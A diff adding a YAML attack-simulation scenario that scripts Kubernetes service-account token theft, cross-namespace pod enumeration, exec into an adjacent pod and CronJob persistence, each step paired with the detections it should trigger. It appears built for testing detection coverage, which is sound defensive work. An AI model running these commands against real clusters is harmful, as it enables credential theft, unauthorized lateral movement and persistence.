@@ -1,0 +1,187 @@
+scenario_id: SIM-CDR-004
+name: "Kubernetes Lateral Movement and Persistence"
+version: "1.0"
+status: active
+
+plane: CDR
+detection_types:
+  - BIOC
+  - Analytics
+
+uc_ref: UCS-CDR-04
+tc_ref: TC-CDR-04
+uc_name: "Kubernetes Lateral Movement Detection"
+tc_name: "kubectl Abuse and CronJob Persistence"
+
+mitre_tactic: "TA0008"
+mitre_tactic_name: "Lateral Movement"
+mitre_technique: "T1021.001"
+mitre_technique_name: "Remote Services: SSH"
+additional_techniques:
+  - technique: "T1053.005"
+    name: "Scheduled Task/Job: Cron"
+  - technique: "T1552.001"
+    name: "Unsecured Credentials: Credentials In Files"
+
+threat_report: "Unit42 - Attackers Are Increasingly Targeting Kubernetes"
+threat_report_url: "https://unit42.paloaltonetworks.com/attackers-are-increasingly-targeting-kubernetes/"
+
+execution_identity:
+  default: container-runtime
+  options:
+    - container-runtime
+    - node
+
+push_supported: true
+pull_supported: true
+
+external_tools:
+  - name: kubectl
+    source: "https://kubernetes.io/docs/tasks/tools/"
+    type: binary
+    install_inline: false
+
+steps:
+  - id: step-01
+    name: "Enumerate Kubernetes service accounts and RBAC permissions"
+    command: |
+      echo '[*] Enumerating service account context...' && \
+      cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null && echo '' && \
+      TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null) && \
+      APISERVER="https://kubernetes.default.svc" && \
+      CACERT="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt" && \
+      curl -sSk --cacert "$CACERT" -H "Authorization: Bearer $TOKEN" \
+        "$APISERVER/api/v1/namespaces" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); [print(i['metadata']['name']) for i in d.get('items',[])]" 2>/dev/null && \
+      echo '[*] Namespace enumeration complete'
+    identity: container-runtime
+    mitre_technique: "T1613"
+    expected_detections:
+      - plane: CDR
+        type: BIOC
+        description: "Kubernetes API server enumeration from within pod using mounted service account token"
+      - plane: CDR
+        type: Analytics
+        description: "Service account token used for API server discovery — anomalous cluster enumeration behavior"
+
+  - id: step-02
+    name: "Steal service account token from mounted secret"
+    command: |
+      TOKEN_PATH="/var/run/secrets/kubernetes.io/serviceaccount/token" && \
+      echo '[*] Extracting service account token...' && \
+      cat "$TOKEN_PATH" 2>/dev/null | cut -c1-80 && echo '...[truncated]' && \
+      cp "$TOKEN_PATH" /tmp/stolen_sa_token 2>/dev/null && \
+      echo "[!] Token copied to /tmp/stolen_sa_token" && \
+      ls -la /var/run/secrets/kubernetes.io/serviceaccount/ && \
+      echo '[*] Service account credential harvest complete'
+    identity: container-runtime
+    mitre_technique: "T1552.001"
+    expected_detections:
+      - plane: CDR
+        type: BIOC
+        description: "Service account token read and copied — Kubernetes credential theft from mounted secret volume"
+      - plane: CDR
+        type: Analytics
+        description: "Sensitive Kubernetes credential file access pattern — token exfiltration to /tmp staging directory"
+
+  - id: step-03
+    name: "kubectl get pods --all-namespaces via stolen SA token"
+    command: |
+      which kubectl || (curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl" -o /tmp/kubectl 2>/dev/null && chmod +x /tmp/kubectl && alias kubectl=/tmp/kubectl); \
+      KUBECTL=$(which kubectl 2>/dev/null || echo /tmp/kubectl) && \
+      TOKEN=$(cat /tmp/stolen_sa_token 2>/dev/null) && \
+      APISERVER="https://kubernetes.default.svc" && \
+      echo '[*] Enumerating all pods across namespaces...' && \
+      "$KUBECTL" --server="$APISERVER" --token="$TOKEN" --insecure-skip-tls-verify \
+        get pods --all-namespaces 2>&1 | tee /tmp/pod_enum.txt && \
+      echo '[*] Cross-namespace pod enumeration complete'
+    identity: container-runtime
+    mitre_technique: "T1613"
+    expected_detections:
+      - plane: CDR
+        type: BIOC
+        description: "kubectl --all-namespaces enumeration from within pod — cross-namespace discovery using stolen token"
+      - plane: CDR
+        type: Analytics
+        description: "Cluster-wide pod discovery via kubectl in container — lateral movement reconnaissance pattern"
+
+  - id: step-04
+    name: "kubectl exec into adjacent pod (lateral movement)"
+    command: |
+      KUBECTL=$(which kubectl 2>/dev/null || echo /tmp/kubectl) && \
+      TOKEN=$(cat /tmp/stolen_sa_token 2>/dev/null) && \
+      APISERVER="https://kubernetes.default.svc" && \
+      TARGET_POD=$("$KUBECTL" --server="$APISERVER" --token="$TOKEN" --insecure-skip-tls-verify \
+        get pods --all-namespaces -o jsonpath='{.items[1].metadata.name}' 2>/dev/null) && \
+      TARGET_NS=$("$KUBECTL" --server="$APISERVER" --token="$TOKEN" --insecure-skip-tls-verify \
+        get pods --all-namespaces -o jsonpath='{.items[1].metadata.namespace}' 2>/dev/null) && \
+      echo "[*] Attempting kubectl exec into pod: $TARGET_POD in namespace: $TARGET_NS" && \
+      "$KUBECTL" --server="$APISERVER" --token="$TOKEN" --insecure-skip-tls-verify \
+        exec -n "$TARGET_NS" "$TARGET_POD" -- id 2>&1 && \
+      echo '[!] Successfully executed command in adjacent pod' || echo '[-] Exec into adjacent pod failed — RBAC may restrict exec'
+    identity: node
+    mitre_technique: "T1021.001"
+    expected_detections:
+      - plane: CDR
+        type: BIOC
+        description: "kubectl exec into pod in different namespace — lateral movement via Kubernetes API (high fidelity CDR BIOC)"
+      - plane: CDR
+        type: Analytics
+        description: "Cross-namespace pod exec from compromised container — Kubernetes lateral movement chain detected"
+
+  - id: step-05
+    name: "Create malicious Kubernetes CronJob for persistence"
+    command: |
+      KUBECTL=$(which kubectl 2>/dev/null || echo /tmp/kubectl) && \
+      TOKEN=$(cat /tmp/stolen_sa_token 2>/dev/null) && \
+      APISERVER="https://kubernetes.default.svc" && \
+      cat > /tmp/cortexsim-cronjob.yaml << 'CRONEOF'
+      apiVersion: batch/v1
+      kind: CronJob
+      metadata:
+        name: cortexsim-persistence-sim
+        namespace: default
+        labels:
+          app: cortexsim-sim
+      spec:
+        schedule: "*/5 * * * *"
+        jobTemplate:
+          spec:
+            template:
+              spec:
+                containers:
+                - name: worker
+                  image: alpine:latest
+                  command: ["/bin/sh", "-c", "echo CORTEXSIM-SIM-CDR-004 >> /tmp/persist.txt"]
+                restartPolicy: OnFailure
+      CRONEOF
+      "$KUBECTL" --server="$APISERVER" --token="$TOKEN" --insecure-skip-tls-verify \
+        apply -f /tmp/cortexsim-cronjob.yaml 2>&1 && \
+      echo '[!] Malicious CronJob deployed for persistence' || echo '[-] CronJob creation failed — may require additional RBAC'
+    identity: container-runtime
+    mitre_technique: "T1053.005"
+    expected_detections:
+      - plane: CDR
+        type: BIOC
+        description: "Kubernetes CronJob creation via kubectl — scheduled task persistence mechanism in cluster"
+      - plane: CDR
+        type: Analytics
+        description: "CronJob creation anomaly — new batch workload created from compromised pod context, cross-namespace pattern"
+
+cleanup:
+  commands:
+    - "kubectl --insecure-skip-tls-verify delete cronjob cortexsim-persistence-sim -n default 2>/dev/null || true"
+    - "rm -f /tmp/stolen_sa_token /tmp/pod_enum.txt /tmp/cortexsim-cronjob.yaml /tmp/kubectl"
+    - "echo '[CortexSim] SIM-CDR-004 cleanup complete'"
+  k8s_teardown: "kubectl delete -f {manifest_path}"
+
+author: "Henry Reed"
+created: "2026-04-12"
+last_updated: "2026-04-12"
+tags:
+  - kubernetes
+  - lateral-movement
+  - kubectl-abuse
+  - service-account-theft
+  - cronjob-persistence
+  - k8s-rbac
+  - cloud-native
